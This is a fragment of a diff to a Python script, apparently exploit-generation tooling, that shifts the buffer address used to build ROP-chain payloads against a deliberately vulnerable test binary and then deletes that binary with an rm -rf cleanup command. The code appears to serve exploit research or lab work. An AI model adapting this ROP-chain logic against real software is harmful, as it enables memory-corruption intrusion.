@@ -998,11 +998,11 @@ if __name__ == '__main__':
 
     elif (len(libraries) == 1) and (libraries[0].count("libc") == 1):
         buffer_address = find_buffer_addr(vuln_bin, 444, if_use_gdb)
-        rop_payload = build_rop_chain_libc_syscalls(lib_list, buffer_address)
+        rop_payload = build_rop_chain_libc_syscalls(lib_list, buffer_address + 128)
 
     else:
         buffer_address = find_buffer_addr(vuln_bin, 416, if_use_gdb)
-        rop_payload = build_rop_chain_syscall_generic(lib_list, buffer_address)
+        rop_payload = build_rop_chain_syscall_generic(lib_list, buffer_address + 128)
 
     rm_command = "rm -rf ./vuln2 ./vuln2.c"
     rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
